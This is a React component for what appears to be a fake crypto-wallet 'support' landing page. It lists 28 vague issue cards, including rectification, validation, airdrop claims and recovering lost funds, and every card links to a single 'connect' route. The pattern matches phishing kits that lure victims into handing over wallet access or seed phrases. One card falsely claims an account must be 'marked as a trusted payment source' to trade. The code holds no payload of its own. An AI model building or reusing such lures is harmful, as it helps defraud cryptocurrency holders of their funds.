import React from "react";
import { FaBuildingColumns } from "react-icons/fa6";
import { Link } from "react-router-dom";

const datas = [
  {
    heading: "Assets Recovery",
    text: "Click here for assets recovery issues",
    image: <FaBuildingColumns />,
  },
  {
    heading: "General Issues",
    text: "Click here for general related issues",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Rectification",
    text: "Click here to rectify issues",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Buy and Sell",
    text: "Click here for to buy and sell tokens.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "High Gas Fees",
    text: "Click here for gas fee related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Claim Reward",
    text: "Click here for reward related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Deposits & Withdrawals",
    text: "Click here for withdrawal related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Validation",
    text: "click here for Validation related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Slippage Error",
    text: "Click here for slippage related error during trade.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Transaction Error",
    text: "Click here for transaction related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Liquidity Issues",
    text: "Click here for liquidity related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Cross Chain Transfer",
    text: "Click here for cross chain bridge issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Staking",
    text: "click here for staking related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Swap/Exchange",
    text: "Click here for swap/exchange related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Connect to Dapps",
    text: "Click here for error while connecting to Dapps",
    image: <FaBuildingColumns />,
  },
  {
    heading: "KYC",
    text: "Click here KYC related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Login Issues",
    text: "Click here for issues while logging into your wallet.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Claim Airdrop",
    text: "Click here for airdrop related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Migration",
    text: "Click here for any issues related to migration.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "NFTS Issues",
    text: "Click here for NFTs minting/transfer related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Missing/Irregular Balance",
    text: "Click here to recover lost/missing funds.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Whitelist Issues",
    text: "Click here for whitelist related issues.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Transaction Delay",
    text: "Click here for any issues related to transaction delayed.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Locked Account",
    text: "Click here for issues related to account lock.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Trading Wallet Issues",
    text: "Click here if you have problem with your trading wallet.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Unable To Buy Coins/Tokens",
    text: "To trade crypto your account must be marked as a trusted payment source.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Token Bridge",
    text: "Click here for any issues related to token bridge.",
    image: <FaBuildingColumns />,
  },
  {
    heading: "Other Issues Not Listed",
    text: "If you can't find the issue you are experiencing click here",
    image: <FaBuildingColumns />,
  },
];

const Section = () => {
  return (
    <div className="">
      <h1 className="mb-7 text-4xl md:text-5xl font-semibold text-white">
        Make Your Selection Below
      </h1>
      <div className="grid md:grid-cols-2 xl:grid-cols-3 gap-5">
        {datas.map((data, key) => {
          return (
            <div className=" text-xl flex flex-col items-start bg-gray-300 rounded-2xl p-7 gap-5">
              <span className="text-7xl text-[#0D0D2B]">{data.image}</span>
              <h2 className="text-2xl">{data.heading}</h2>
              <Link to="connect">
                <p>{data.text}</p>
              </Link>{" "}
            </div>
          );
        })}
      </div>
    </div>
  );
};

export default Section;
